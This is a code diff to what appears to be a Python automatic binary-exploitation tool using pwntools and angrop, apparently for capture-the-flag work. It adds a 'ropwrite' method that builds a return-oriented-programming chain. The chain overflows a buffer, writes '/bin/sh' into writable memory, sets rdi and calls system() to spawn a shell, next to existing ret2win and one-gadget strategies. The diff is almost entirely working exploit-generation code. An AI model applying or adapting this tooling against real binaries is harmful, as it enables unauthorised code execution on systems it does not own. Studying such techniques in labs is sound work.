@@ -1,5 +1,6 @@
 from pwn import *
 import angr
+import angrop
 import claripy
 import subprocess
 import os
@@ -13,7 +14,29 @@ class ROP:
         self.gadgets = []
         self.find_gadgets()
         self.libc = "/opt/libc.so.6"
+        # angrop stuff
+        self.angr_proj = angr.Project(self.analysis.binary)
+        self.angr_rop  = self.angr_proj.analyses.ROP()
+        self.angr_rop.find_gadgets_single_threaded()
+
+    def write_binsh_to_mem(self):
+        return self.angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
+
+    def ropwrite(self, dumb=False):
+        chain = b'A'*self.offset
+        chain += self.write_binsh_to_mem()
+        chain += self.fill_reg("rdi", self.get_writeable_mem())
+        if dumb:
+            chain += self.realign()
+        chain += p64(self.analysis.elf.sym['system'])
+        self.put_binsh=True
+        self.analysis.hbsh=True
+        return chain
     
+
+
+    
+
     def build_exploit(self):
         payload = None
         if self.analysis.has_win():
@@ -31,6 +54,7 @@ class ROP:
             payload = self.ret2one()
         else:
             print("[!] Exploit not found!")
+        #payload = self.ropwrite()
 
         return payload
     
